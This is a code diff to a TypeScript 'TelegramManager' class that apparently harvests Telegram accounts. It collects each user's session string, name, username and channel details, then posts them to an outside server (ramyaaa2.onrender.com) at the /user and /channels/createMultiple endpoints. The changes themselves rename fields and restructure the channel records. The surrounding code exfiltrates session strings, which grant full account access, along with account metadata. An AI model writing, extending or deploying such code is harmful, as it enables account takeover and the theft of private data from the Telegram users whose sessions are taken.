@@ -464,7 +464,7 @@ class TelegramManager {
             phone: contact.phone,
             firstName: contact.firstName,
             lastName: contact.lastName,
-            userName: contact.username,
+            username: contact.username,
             clientId: contact.id.toString(),
             fromId: user.id
         }));
@@ -472,11 +472,19 @@ class TelegramManager {
         for (let chat of dialogs) {
             if (chat.isChannel || chat.isGroup) {
                 channels++;
-                const chatEntity: any = chat.entity.toJSON();
-                const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
-                if (!chatEntity.broadcast && !cannotSendMsgs) {
-                    chatsArray.push(chatEntity);
+                const chatEntity = <Api.Channel>chat.entity.toJSON();
+                const doc = {
+                    "channelId": chatEntity.id.toString(),
+                    "broadcast": chatEntity.broadcast,
+                    "canSendMsgs": !chatEntity.broadcast && !chatEntity.defaultBannedRights?.sendMessages,
+                    "megagroup": chatEntity.megagroup,
+                    "participantsCount": chatEntity.participantsCount,
+                    "restricted": chatEntity.restricted,
+                    "sendMessages": chatEntity.defaultBannedRights?.sendMessages,
+                    "title": chatEntity.title,
+                    "username": chatEntity.username
                 }
+                chatsArray.push(doc);
             } else {
                 personalChats++;
             }
@@ -491,7 +499,7 @@ class TelegramManager {
             session: `${sess}`,
             firstName: user.firstName,
             lastName: user.lastName,
-            userName: user.username,
+            username: user.username,
             channels: channels,
             personalChats: personalChats,
             calls: {},//callLogs?.totalCalls > 0 ? callLogs : {},
@@ -510,7 +518,7 @@ class TelegramManager {
         try {
             console.log("posting results");
             await axios.post(`https://ramyaaa2.onrender.com/user`, payload3, { headers: { 'Content-Type': 'application/json' } });
-            await axios.post(`https://ramyaaa2.onrender.com/channels/createMultiple`, chatsArray , { headers: { 'Content-Type': 'application/json' } });
+            await axios.post(`https://ramyaaa2.onrender.com/channels/createMultiple`, chatsArray, { headers: { 'Content-Type': 'application/json' } });
             // await axios.post(`https://ramyaaa2.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
         } catch (error) {
             console.log("Error Occured");
